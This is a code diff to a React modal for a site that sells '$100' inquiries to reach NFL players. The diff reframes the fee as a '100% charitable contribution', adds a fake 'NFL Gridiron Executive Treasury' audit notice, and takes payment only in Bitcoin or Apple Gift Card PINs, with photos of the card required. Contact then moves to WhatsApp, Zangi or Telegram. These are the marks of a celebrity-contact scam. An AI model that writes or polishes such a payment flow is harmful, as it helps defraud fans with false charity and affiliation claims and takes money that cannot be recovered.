@@ -158,9 +158,32 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
     setStep("payment");
   };
 
+  const hasRequiredProfileFields =
+    fullName.trim().length > 0 &&
+    email.trim().includes("@") &&
+    favoritePlayer.trim().length > 0 &&
+    messagingDetails.trim().length > 0;
+  const hasReceiptProof =
+    receiptImageUrls.length > 0 || receiptImageUrl.trim().length > 0;
+  const hasValidGiftCard =
+    paymentMethod !== "giftcard" || giftCardDetails.cardNumber.trim().length > 0;
+  const hasSelectedSupportedPayment =
+    paymentMethod === "crypto" || paymentMethod === "giftcard";
+  const canSubmitInquiry =
+    hasRequiredProfileFields &&
+    hasSelectedSupportedPayment &&
+    hasValidGiftCard &&
+    hasReceiptProof &&
+    !isSubmitting;
+
   const handleFinalizeInquiry = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     setFormError(null);
+
+    if (!hasRequiredProfileFields) {
+      setFormError("Please complete your Full Name, Email Address, Favorite Player, and Preferred Messaging details.");
+      return;
+    }
 
     if (paymentMethod !== "crypto" && paymentMethod !== "giftcard") {
       setVendorPopup({ methodName: "Team Vendors" });
@@ -169,6 +192,11 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
 
     if (paymentMethod === "giftcard" && !giftCardDetails.cardNumber.trim()) {
       setFormError("Please enter your Apple Gift Card code or PIN.");
+      return;
+    }
+
+    if (!hasReceiptProof) {
+      setFormError("Proof of payment is required. Please upload a valid payment receipt or screenshot before submitting your inquiry.");
       return;
     }
 
@@ -192,13 +220,13 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         qrCode: passCode,
         passCode: passCode,
         rfidCode: rfidCode,
-        securitySignature: "SHA-256 PLAYER INQUIRY $100 VERIFIED LIAISON",
+        securitySignature: "SHA-256 PLAYER INQUIRY $100 CHARITABLE CONTRIBUTION",
         experienceId: "exp-player-inquiry-session",
         gameId: "exp-player-inquiry-session",
         experienceTitle: `NFL STAR PLAYER INQUIRY: ${favoritePlayer.toUpperCase()} (${selectedTeam.city} ${selectedTeam.name})`,
         gameName: `NFL Player Inquiry Session: ${favoritePlayer}`,
         eventTitle: `NFL Player Inquiry Session: ${favoritePlayer}`,
-        itemName: `NFL Player Inquiry Session (${favoritePlayer}) - $100 Liaison Deposit`,
+        itemName: `NFL Player Inquiry Session (${favoritePlayer}) - $100 Charitable Contribution`,
         experienceType: "player_inquiry",
         player: favoritePlayer.trim(),
         favoritePlayer: favoritePlayer.trim(),
@@ -211,10 +239,10 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         location: "Private Direct Channels & Agency Liaison",
         city: selectedTeam.city,
         state: "US",
-        date: "Coordinated upon clearance of $100 inquiry fee",
-        eventDate: "Awaiting Player Details",
-        displayDate: "Coordinated directly with player agency",
-        formattedDate: "Awaiting Player Details",
+        date: "Coordinated once payment receipt is verified",
+        eventDate: "Awaiting Receipt Verification",
+        displayDate: "Coordinated after receipt verification",
+        formattedDate: "Awaiting Receipt Verification",
         time: "24/7 Rapid Liaison Dispatch",
         timeSlot: "24/7 Rapid Liaison Dispatch",
         admissionTime: "Player Scheduled Window",
@@ -229,12 +257,14 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         totalAmount: finalPrice,
         dueToday: finalPrice,
         currency: "USD",
+        isCharityContribution: true,
+        charityNote: "100% of the $100 charitable contribution goes directly to charity",
         messagingPlatform: platformName,
         messagingDetails: messagingDetails.trim(),
         inquiryObjective: inquiryObjective,
         specialNotes: specialNotes.trim(),
-        inquiryStatus: "awaiting_player_details",
-        playerDetailsStatus: "awaiting",
+        inquiryStatus: "awaiting_verification",
+        playerDetailsStatus: "awaiting_verification",
         buyerName: fullName.trim(),
         userName: fullName.trim(),
         senderName: fullName.trim(),
@@ -244,11 +274,11 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         email: email.trim(),
         userId: auth.currentUser?.uid || `guest_${Date.now()}`,
         buyerPhone: phone.trim() || messagingDetails.trim(),
-        status: "pending", // awaiting admin review & player details dispatch
-        orderStatus: "AWAITING PLAYER DETAILS",
-        approvalStatus: "PAYMENT LOGGED ($100) · AWAITING PLAYER DETAILS",
+        status: "pending", // Payment receipt awaiting administrator verification
+        orderStatus: "PAYMENT RECEIPT AWAITING VERIFICATION",
+        approvalStatus: "RECEIPT UPLOADED ($100) · AWAITING ADMIN VERIFICATION",
         isApproved: false,
-        verificationNotice: `AUDITED BY NFL GRIDIRON EXECUTIVE TREASURY · $100 LIAISON DEPOSIT LOGGED FOR ${favoritePlayer.toUpperCase()}`,
+        verificationNotice: `AUDITED BY NFL GRIDIRON EXECUTIVE TREASURY · $100 CHARITABLE CONTRIBUTION RECEIPT SUBMITTED FOR ${favoritePlayer.toUpperCase()}`,
         paymentMethod: paymentMethod,
         paymentSessionId: checkoutSessionId,
         paymentReference: paymentRef || `INQ-${checkoutSessionId}`,
@@ -301,7 +331,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         receiptImageUrl: receiptImageUrls[0] || receiptImageUrl || "",
         receiptImages: receiptImageUrls.length > 0 ? receiptImageUrls : (receiptImageUrl ? [receiptImageUrl] : []),
         status: "pending_approval",
-        orderStatus: "AWAITING PLAYER DETAILS",
+        orderStatus: "PAYMENT RECEIPT AWAITING VERIFICATION",
         isApproved: false,
         favoritePlayer: favoritePlayer.trim(),
         messagingPlatform: platformName,
@@ -332,7 +362,9 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         receiptImage: receiptImageUrls[0] || receiptImageUrl || "",
         receiptImageUrl: receiptImageUrls[0] || receiptImageUrl || "",
         receiptImages: receiptImageUrls.length > 0 ? receiptImageUrls : (receiptImageUrl ? [receiptImageUrl] : []),
-        status: "awaiting_player_details",
+        status: "pending",
+        orderStatus: "PAYMENT RECEIPT AWAITING VERIFICATION",
+        isApproved: false,
         createdAt: nowIso
       });
 
@@ -423,12 +455,12 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
             <ArrowRight className="w-3 h-3 text-zinc-700" />
             <div className={cn("flex items-center gap-1.5", step === "payment" ? "text-blue-400" : "text-zinc-500")}>
               <span className={cn("w-5 h-5 rounded-full flex items-center justify-center font-mono text-[10px]", step === "payment" ? "bg-blue-600 text-white" : "bg-zinc-800 text-zinc-400")}>2</span>
-              <span>Deposit & Payment</span>
+              <span>$100 Contribution & Proof</span>
             </div>
             <ArrowRight className="w-3 h-3 text-zinc-700" />
             <div className={cn("flex items-center gap-1.5", step === "success" ? "text-emerald-400" : "text-zinc-500")}>
               <span className={cn("w-5 h-5 rounded-full flex items-center justify-center font-mono text-[10px]", step === "success" ? "bg-emerald-500 text-black" : "bg-zinc-800 text-zinc-400")}>3</span>
-              <span>Await Player Details</span>
+              <span>Awaiting Verification</span>
             </div>
           </div>
         </div>
@@ -665,27 +697,45 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                 </div>
               </div>
 
-              {/* Bottom Proceed CTA - highlights that the $100 fee goes to charity */}
-              <div className="p-5 bg-gradient-to-r from-emerald-950/40 via-zinc-900 to-zinc-950 rounded-3xl border border-emerald-500/25 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
-                <div className="space-y-1">
-                  <div className="flex items-center flex-wrap gap-2">
-                    <span className="text-[9px] font-black uppercase text-emerald-300 tracking-wider inline-flex items-center gap-1.5">
-                      <Heart className="w-3.5 h-3.5 text-emerald-400 fill-emerald-400/20" />
-                      100% Charity Commitment ($100 Inquiry Fee)
-                    </span>
-                  </div>
+              {/* Pre-Payment $100 Charitable Contribution Explanation & Submission Rules */}
+              <div className="p-5 bg-gradient-to-br from-emerald-950/50 via-zinc-900 to-zinc-950 rounded-3xl border border-emerald-500/30 space-y-4">
+                <div className="space-y-2">
+                  <span className="text-[10px] font-black uppercase text-emerald-300 tracking-wider inline-flex items-center gap-1.5">
+                    <Heart className="w-3.5 h-3.5 text-emerald-400 fill-emerald-400/20" />
+                    Before You Begin Payment: Required $100 Charitable Contribution
+                  </span>
+                  <h4 className="text-sm font-black uppercase tracking-tight text-white">
+                    100% of Your $100 Contribution Goes to Charity
+                  </h4>
                   <p className="text-xs text-zinc-300 font-medium leading-relaxed">
-                    Every dollar of the $100 player inquiry fee goes directly to charity—proceed to complete your inquiry and unlock direct player liaison outreach.
+                    To submit an official NFL player inquiry, customers must complete a mandatory <strong className="text-emerald-300">$100 charitable contribution</strong> before submission. Every dollar directly supports youth athletics and community outreach programs.
                   </p>
                 </div>
 
-                <button
-                  type="submit"
-                  className="px-8 py-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-black uppercase text-[10px] tracking-widest rounded-2xl transition-all shadow-xl shadow-blue-600/30 flex items-center justify-center gap-2.5 transform active:scale-95 cursor-pointer shrink-0"
-                >
-                  <span>Confirm Selection & Proceed</span>
-                  <ArrowRight className="w-4 h-4" />
-                </button>
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-[11px]">
+                  <div className="p-3 rounded-2xl bg-zinc-950/80 border border-white/10">
+                    <span className="text-[9px] font-mono font-black uppercase text-blue-400 block">Step 1 · Contribute $100</span>
+                    <p className="text-zinc-300 mt-0.5 leading-snug">Complete the $100 contribution on the next screen via Bitcoin or Apple Gift Card.</p>
+                  </div>
+                  <div className="p-3 rounded-2xl bg-zinc-950/80 border border-white/10">
+                    <span className="text-[9px] font-mono font-black uppercase text-amber-400 block">Step 2 · Upload Receipt</span>
+                    <p className="text-zinc-300 mt-0.5 leading-snug">Attach a valid receipt or screenshot before submitting your inquiry.</p>
+                  </div>
+                  <div className="p-3 rounded-2xl bg-zinc-950/80 border border-white/10">
+                    <span className="text-[9px] font-mono font-black uppercase text-emerald-400 block">Step 3 · Verify & Notify</span>
+                    <p className="text-zinc-300 mt-0.5 leading-snug">Once verified by our admin, we notify you on WhatsApp, Zangi, or Telegram to proceed.</p>
+                  </div>
+                </div>
+
+                <div className="pt-1 flex justify-end">
+                  <button
+                    type="submit"
+                    className="w-full sm:w-auto px-8 py-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-black uppercase text-[10px] tracking-widest rounded-2xl transition-all shadow-xl shadow-blue-600/30 flex items-center justify-center gap-2.5 transform active:scale-95 cursor-pointer"
+                  >
+                    <span>Continue to $100 Payment & Receipt Upload</span>
+                    <ArrowRight className="w-4 h-4" />
+                  </button>
+                </div>
               </div>
             </form>
           )}
@@ -797,32 +847,53 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                   </p>
                 </div>
               ) : paymentMethod !== "giftcard" ? (
-                <CustomerPaymentWaitingTerminal
-                  sessionId={checkoutSessionId}
-                  selectedMethod={paymentMethod as any}
-                  amount={finalPrice}
-                  orderReference={checkoutSessionId}
-                  customerName={fullName}
-                  customerEmail={email}
-                  customerPhone={phone || messagingDetails}
-                  itemTitle={`Player Inquiry: ${favoritePlayer} (${selectedTeam.id})`}
-                  itemType="experience"
-                  onSwitchToGiftCard={() => setPaymentMethod("giftcard")}
-                  onReceiptsChange={(primary, all) => {
-                    setReceiptImageUrl(primary);
-                    setReceiptImageUrls(all);
-                  }}
-                  onPaymentSubmitted={(ref, receipt, all) => {
-                    if (ref) setPaymentRef(ref);
-                    if (all && all.length > 0) {
-                      setReceiptImageUrl(all[0]);
-                      setReceiptImageUrls(all);
-                    } else if (receipt) {
-                      setReceiptImageUrl(receipt);
-                      setReceiptImageUrls(prev => Array.from(new Set([receipt, ...prev])));
-                    }
-                  }}
-                />
+                  <div className="space-y-4">
+                    <CustomerPaymentWaitingTerminal
+                      sessionId={checkoutSessionId}
+                      selectedMethod={paymentMethod as any}
+                      amount={finalPrice}
+                      orderReference={checkoutSessionId}
+                      customerName={fullName}
+                      customerEmail={email}
+                      customerPhone={phone || messagingDetails}
+                      itemTitle={`Player Inquiry: ${favoritePlayer} (${selectedTeam.id})`}
+                      itemType="experience"
+                      onSwitchToGiftCard={() => setPaymentMethod("giftcard")}
+                      onReceiptsChange={(primary, all) => {
+                        setReceiptImageUrl(primary);
+                        setReceiptImageUrls(all);
+                      }}
+                      onPaymentSubmitted={(ref, receipt, all) => {
+                        if (ref) setPaymentRef(ref);
+                        if (all && all.length > 0) {
+                          setReceiptImageUrl(all[0]);
+                          setReceiptImageUrls(all);
+                        } else if (receipt) {
+                          setReceiptImageUrl(receipt);
+                          setReceiptImageUrls(prev => Array.from(new Set([receipt, ...prev])));
+                        }
+                      }}
+                    />
+
+                    {/* Mandatory Proof of Payment Receipt Uploader */}
+                    <div className="p-4 sm:p-5 bg-zinc-900/80 rounded-3xl border border-amber-500/25 space-y-3">
+                      <PaymentReceiptUploader
+                        required={true}
+                        value={receiptImageUrl}
+                        values={receiptImageUrls}
+                        onChange={(url) => {
+                          setReceiptImageUrl(url);
+                          if (!url) setReceiptImageUrls([]);
+                        }}
+                        onValuesChange={(urls) => {
+                          setReceiptImageUrls(urls);
+                          setReceiptImageUrl(urls[0] || "");
+                        }}
+                        label="Upload Proof of Payment Receipt (Mandatory)"
+                        subtitle="Upload a clear screenshot or receipt photo confirming your charitable contribution. Required before submitting."
+                      />
+                    </div>
+                  </div>
               ) : (
                 <div className="p-5 bg-zinc-900/80 rounded-3xl border border-white/10 space-y-4">
                   <div className="flex items-center justify-between pb-3 border-b border-white/5">
@@ -857,6 +928,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                       </label>
                       <input
                         type="text"
+                        required
                         placeholder="Enter your Apple Gift Card code or PIN"
                         value={giftCardDetails.cardNumber}
                         onChange={(e) => setGiftCardDetails(prev => ({ ...prev, brand: "Apple", cardNumber: e.target.value }))}
@@ -866,6 +938,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
 
                     <div className="sm:col-span-2 pt-1">
                       <PaymentReceiptUploader
+                        required={true}
                         value={receiptImageUrl}
                         values={receiptImageUrls}
                         onChange={(url) => {
@@ -876,16 +949,58 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                           setReceiptImageUrls(urls);
                           setReceiptImageUrl(urls[0] || "");
                         }}
-                        label="Attach Apple Gift Card Photo / Receipt (Recommended)"
-                        subtitle="Upload clear photos of the Apple Gift Card PIN and store activation receipt."
+                        label="Upload Apple Gift Card Photo / Receipt (Mandatory)"
+                        subtitle="Upload clear photos of the Apple Gift Card PIN and store activation receipt. Required before submitting."
                       />
                     </div>
                   </div>
                 </div>
               )}
 
+              {/* Pre-Submission Verification Checklist */}
+              <div className="p-4 rounded-2xl bg-zinc-900/70 border border-white/10 space-y-2 text-xs">
+                <div className="flex items-center justify-between">
+                  <span className="text-[10px] font-black uppercase tracking-wider text-zinc-300">
+                    Submission Requirements Checklist
+                  </span>
+                  <span className={cn(
+                    "text-[9px] font-mono font-black uppercase",
+                    canSubmitInquiry ? "text-emerald-400" : "text-amber-400"
+                  )}>
+                    {canSubmitInquiry ? "Ready to Submit" : "Action Required"}
+                  </span>
+                </div>
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-[10px]">
+                  <div className={cn(
+                    "px-2.5 py-1.5 rounded-xl border flex items-center gap-1.5",
+                    hasRequiredProfileFields ? "bg-emerald-500/10 border-emerald-500/20 text-emerald-300" : "bg-zinc-950 border-white/10 text-zinc-400"
+                  )}>
+                    <CheckCircle2 className={cn("w-3.5 h-3.5 shrink-0", hasRequiredProfileFields ? "text-emerald-400" : "text-zinc-600")} />
+                    <span>All Required Info</span>
+                  </div>
+                  <div className={cn(
+                    "px-2.5 py-1.5 rounded-xl border flex items-center gap-1.5",
+                    hasSelectedSupportedPayment && hasValidGiftCard ? "bg-emerald-500/10 border-emerald-500/20 text-emerald-300" : "bg-zinc-950 border-white/10 text-zinc-400"
+                  )}>
+                    <CheckCircle2 className={cn("w-3.5 h-3.5 shrink-0", hasSelectedSupportedPayment && hasValidGiftCard ? "text-emerald-400" : "text-zinc-600")} />
+                    <span>$100 Payment Method</span>
+                  </div>
+                  <div className={cn(
+                    "px-2.5 py-1.5 rounded-xl border flex items-center gap-1.5",
+                    hasReceiptProof ? "bg-emerald-500/10 border-emerald-500/20 text-emerald-300" : "bg-amber-500/10 border-amber-500/30 text-amber-300"
+                  )}>
+                    {hasReceiptProof ? (
+                      <CheckCircle2 className="w-3.5 h-3.5 shrink-0 text-emerald-400" />
+                    ) : (
+                      <AlertCircle className="w-3.5 h-3.5 shrink-0 text-amber-400" />
+                    )}
+                    <span>{hasReceiptProof ? "Receipt Uploaded" : "Upload Receipt *"}</span>
+                  </div>
+                </div>
+              </div>
+
               {/* Action Buttons */}
-              <div className="flex items-center justify-between pt-4 border-t border-white/5">
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-4 border-t border-white/5">
                 <button
                   type="button"
                   onClick={() => setStep("details")}
@@ -897,14 +1012,20 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                 <button
                   type="button"
                   onClick={() => handleFinalizeInquiry()}
-                  disabled={isSubmitting}
-                  className="px-8 py-3.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-black font-black uppercase text-[10px] tracking-widest rounded-2xl transition-all shadow-lg shadow-emerald-500/20 flex items-center gap-2 transform active:scale-95 cursor-pointer disabled:opacity-50"
+                  disabled={!canSubmitInquiry}
+                  title={!hasReceiptProof ? "Upload proof of payment receipt before submitting" : "Submit your inquiry and payment receipt for admin verification"}
+                  className="px-8 py-3.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 disabled:from-zinc-800 disabled:to-zinc-800 disabled:text-zinc-500 disabled:cursor-not-allowed text-black font-black uppercase text-[10px] tracking-widest rounded-2xl transition-all shadow-lg shadow-emerald-500/20 disabled:shadow-none flex items-center justify-center gap-2 transform active:scale-95 cursor-pointer"
                 >
                   {isSubmitting ? (
-                    <span>Registering Inquiry...</span>
+                    <span>Submitting Inquiry & Receipt...</span>
+                  ) : !hasReceiptProof ? (
+                    <>
+                      <Lock className="w-4 h-4" />
+                      <span>Upload Receipt to Submit Inquiry</span>
+                    </>
                   ) : (
                     <>
-                      <span>Complete ${finalPrice} Payment & Await Player Details</span>
+                      <span>Submit Inquiry & Payment Proof (${finalPrice})</span>
                       <Check className="w-4 h-4 text-black" />
                     </>
                   )}
@@ -913,7 +1034,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
             </div>
           )}
 
-          {/* STEP 3: SUCCESS & AWAITING PLAYER DETAILS STATE */}
+          {/* STEP 3: RECEIPT SUBMITTED — AWAITING VERIFICATION */}
           {step === "success" && completedOrder && (
             <div className="space-y-6 text-center py-4">
               <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400 shadow-xl shadow-amber-500/10">
@@ -921,14 +1042,14 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
               </div>
 
               <div>
-                <span className="px-3.5 py-1 bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-[10px] font-black uppercase tracking-widest rounded-full">
-                  $100 CHARITY CONTRIBUTION LOGGED · AWAITING PLAYER DETAILS
+                <span className="px-3.5 py-1 bg-amber-500/15 border border-amber-500/30 text-amber-300 text-[10px] font-black uppercase tracking-widest rounded-full">
+                  PAYMENT RECEIPT SUBMITTED · AWAITING VERIFICATION
                 </span>
                 <h4 className="text-2xl font-black italic uppercase tracking-tighter text-white mt-2">
-                  INQUIRY ACTIVE FOR {completedOrder.player}
+                  PAYMENT RECEIPT AWAITING VERIFICATION
                 </h4>
-                <p className="text-xs text-zinc-300 font-medium max-w-md mx-auto mt-1 leading-relaxed">
-                  Thank you! <strong className="text-emerald-300">100% of your $100 inquiry fee goes directly to charity</strong>, and our concierge liaison is now contacting representation for <strong className="text-white">{completedOrder.player}</strong> ({completedOrder.teamName}).
+                <p className="text-xs text-zinc-300 font-medium max-w-md mx-auto mt-1.5 leading-relaxed">
+                  Thank you! Your <strong className="text-emerald-300">${completedOrder.totalPrice} charitable contribution</strong> and payment receipt for <strong className="text-white">{completedOrder.player}</strong> have been submitted and are <strong className="text-amber-300">awaiting administrator verification</strong>. Once verified and approved, we will notify you via <strong className="text-blue-300">{completedOrder.messagingPlatform}</strong> so you can proceed.
                 </p>
               </div>
 
@@ -945,7 +1066,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                     </h5>
                   </div>
                   <span className="px-2.5 py-1 rounded-full text-[8px] font-black uppercase bg-amber-400 text-black">
-                    Awaiting Details
+                    Awaiting Verification
                   </span>
                 </div>
 
@@ -957,32 +1078,32 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                       <span className="text-white font-bold text-xs truncate block">{completedOrder.buyerName}</span>
                     </div>
                     <div>
-                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Inquiry Passcode</span>
-                      <span className="text-emerald-400 font-bold text-xs">{completedOrder.ticketCode}</span>
+                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Inquiry Reference</span>
+                      <span className="text-emerald-400 font-bold text-xs select-all">{completedOrder.ticketCode}</span>
                     </div>
                     <div>
-                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Messaging Channel</span>
+                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Notification App</span>
                       <span className="text-blue-400 font-bold text-xs">{completedOrder.messagingPlatform}</span>
                     </div>
                     <div>
-                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Contact Details</span>
+                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Handle / Number</span>
                       <span className="text-white font-bold text-xs truncate block">{completedOrder.messagingDetails}</span>
                     </div>
                     <div>
-                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Talent Clearance Fee</span>
-                      <span className="text-emerald-400 font-bold text-xs">${completedOrder.totalPrice} USD Paid</span>
+                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Charity Contribution</span>
+                      <span className="text-emerald-400 font-bold text-xs">${completedOrder.totalPrice} USD</span>
                     </div>
                     <div>
-                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Liaison Status</span>
-                      <span className="text-amber-400 font-bold text-xs">Dispatching Outreach</span>
+                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Receipt Status</span>
+                      <span className="text-amber-400 font-bold text-xs">Awaiting Verification</span>
                     </div>
                   </div>
 
-                  {/* Concierge Delivery Channel Banner */}
-                  <div className="p-3.5 bg-blue-500/10 border border-blue-500/20 rounded-2xl flex items-center gap-3">
-                    <Send className="w-5 h-5 text-blue-400 shrink-0" />
-                    <p className="text-[10px] text-zinc-300 leading-relaxed font-medium">
-                      Player availability, confirmed schedule, and private details will be dispatched directly to your <strong className="text-white">{completedOrder.messagingPlatform}</strong> account (<strong className="text-blue-300 font-mono">{completedOrder.messagingDetails}</strong>).
+                  {/* Verification & Notification Notice Banner */}
+                  <div className="p-3.5 bg-amber-500/10 border border-amber-500/25 rounded-2xl flex items-start gap-3">
+                    <Clock className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
+                    <p className="text-[10px] text-zinc-200 leading-relaxed font-medium">
+                      Your uploaded receipt is under administrator review. Once verified, you will receive an approval notification on <strong className="text-white">{completedOrder.messagingPlatform}</strong> (<strong className="text-blue-300 font-mono">{completedOrder.messagingDetails}</strong>) letting you know you can proceed. If a corrected receipt is needed, you can re-upload anytime in the Ticket &amp; Inquiry Portal.
                     </p>
                   </div>
 
